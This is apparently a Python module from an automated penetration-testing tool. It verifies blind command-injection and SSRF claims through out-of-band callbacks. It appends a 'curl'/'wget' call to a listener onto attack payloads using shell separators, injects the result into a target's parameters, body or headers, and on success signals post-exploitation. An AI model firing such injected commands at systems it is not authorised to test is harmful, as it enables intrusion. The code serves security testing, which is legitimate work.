import asyncio
import uuid
import httpx
from aiohttp import web
from typing import Optional, Set
from veripen.oracles.base_oracle import BaseOracle
from veripen.core.schemas import (
    ExploitClaim,
    FailureDiagnostic,
    VerificationStatus,
    RecommendedAction,
    InjectionPoint
)

class OASTListenerOracle(BaseOracle):
    """
    Deterministic Verification Oracle for Blind RCE and SSRF (CWE-918).
    Eliminates blind exploitation hallucinations via ephemeral out-of-band callback capture.
    """

    def __init__(self, listener_host: str = "127.0.0.1", listener_port: int = 8888, timeout_seconds: float = 6.0):
        super().__init__(oracle_name="OASTListenerOracle", timeout_seconds=timeout_seconds)
        self.listener_host = listener_host
        self.listener_port = listener_port
        self.received_tokens: Set[str] = set()
        self.server_runner: Optional[web.AppRunner] = None

    async def _handle_callback(self, request: web.Request) -> web.Response:
        token = request.query.get("token") or request.match_info.get("token")
        if not token and request.can_read_body:
            body = await request.text()
            token = body.strip()
            
        if token:
            self.received_tokens.add(token)
        return web.Response(text="VERIPEN_ACK")

    async def start_listener(self):
        if self.server_runner is None:
            app = web.Application()
            app.router.add_get("/", self._handle_callback)
            app.router.add_post("/", self._handle_callback)
            app.router.add_get("/{token}", self._handle_callback)
            app.router.add_post("/{token}", self._handle_callback)
            
            self.server_runner = web.AppRunner(app)
            await self.server_runner.setup()
            site = web.TCPSite(self.server_runner, self.listener_host, self.listener_port)
            await site.start()

    async def stop_listener(self):
        if self.server_runner:
            await self.server_runner.cleanup()
            self.server_runner = None

    def _synthesize_oast_payload(self, token: str) -> str:
        target_callback = f"http://{self.listener_host}:{self.listener_port}/?token={token}"
        return f"curl -s -m 2 {target_callback} || wget -q -O- {target_callback}"

    async def verify(self, claim: ExploitClaim) -> FailureDiagnostic:
        token = f"canary-{uuid.uuid4().hex[:12]}"
        callback_cmd = self._synthesize_oast_payload(token)
        
        if ";" in claim.candidate_payload:
            probed_payload = f"{claim.candidate_payload}; {callback_cmd};"
        elif "&&" in claim.candidate_payload:
            probed_payload = f"{claim.candidate_payload} && {callback_cmd}"
        elif "|" in claim.candidate_payload:
            probed_payload = f"{claim.candidate_payload} | {callback_cmd}"
        else:
            probed_payload = f"{claim.candidate_payload} ; {callback_cmd}"

        await self.start_listener()
        headers = claim.headers.copy()

        try:
            async with httpx.AsyncClient(timeout=self.timeout_seconds, verify=False) as client:
                if claim.injection_point == InjectionPoint.GET_PARAM:
                    params = {claim.parameter_name or "cmd": probed_payload}
                    await client.get(claim.target_url, params=params, headers=headers)
                elif claim.injection_point in (InjectionPoint.POST_BODY, InjectionPoint.JSON_FIELD):
                    data = {claim.parameter_name or "cmd": probed_payload}
                    if claim.injection_point == InjectionPoint.JSON_FIELD:
                        await client.post(claim.target_url, json=data, headers=headers)
                    else:
                        await client.post(claim.target_url, data=data, headers=headers)
                elif claim.injection_point == InjectionPoint.HEADER:
                    headers[claim.parameter_name or "X-Command"] = probed_payload
                    await client.post(claim.target_url, headers=headers)

            poll_interval = 0.2
            max_wait_iterations = int(self.timeout_seconds / poll_interval)
            
            for _ in range(max_wait_iterations):
                if token in self.received_tokens:
                    return FailureDiagnostic(
                        status=VerificationStatus.VERIFIED,
                        oracle_name=self.oracle_name,
                        rejection_code="PROVEN_OAST_INTERACTION",
                        raw_observation=f"Inbound callback captured on {self.listener_host}:{self.listener_port} matching token {token}.",
                        recommended_action=RecommendedAction.PROCEED_POST_EXPLOIT,
                        mutated_canary=token
                    )
                await asyncio.sleep(poll_interval)

            return FailureDiagnostic(
                status=VerificationStatus.REJECTED,
                oracle_name=self.oracle_name,
                rejection_code="OAST_TIMEOUT",
                raw_observation=f"No out-of-band callback received for token {token} within {self.timeout_seconds}s.",
                recommended_action=RecommendedAction.BACKTRACK_BRANCH,
                mutated_canary=token
            )

        except Exception as e:
            return FailureDiagnostic(
                status=VerificationStatus.ERROR,
                oracle_name=self.oracle_name,
                rejection_code="PROBE_EXECUTION_ERROR",
                raw_observation=f"Exception during OAST trigger: {str(e)}",
                recommended_action=RecommendedAction.TRY_ALTERNATIVE_VECTOR
            )
        finally:
            await self.stop_listener()
